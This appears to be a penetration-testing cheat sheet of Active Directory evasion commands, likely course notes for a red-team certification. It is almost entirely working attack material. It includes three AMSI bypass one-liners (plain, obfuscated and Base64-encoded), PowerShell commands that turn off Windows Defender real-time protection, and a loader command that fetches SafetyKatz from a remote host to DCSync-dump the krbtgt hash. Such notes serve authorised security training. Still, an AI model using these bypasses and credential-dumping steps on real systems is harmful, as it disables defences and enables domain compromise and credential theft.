---
description: Some AMSI and Powershell Bypass Checklists
---

# AD: Bypass

### Bypassing PowerShell Security

Using InviShell - https://github.com/OmerYa/Invisi-Shell

{% code overflow="wrap" %}
```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```
{% endcode %}

### AMSI Bypass

Detection: [https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)

{% tabs %}
{% tab title="2023" %}
{% code overflow="wrap" %}
```powershell
$a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)
```
{% endcode %}
{% endtab %}

{% tab title="CRTP" %}
{% code overflow="wrap" %}
```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
{% endcode %}
{% endtab %}

{% tab title="Base64" %}
{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Disable Windows Defender (as Administrator)

{% code overflow="wrap" %}
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableRealtimeMonitoring $true
```
{% endcode %}

### OPSEC with Loader

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\Loader.exe -path http://172.16.100.67/SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```
{% endcode %}
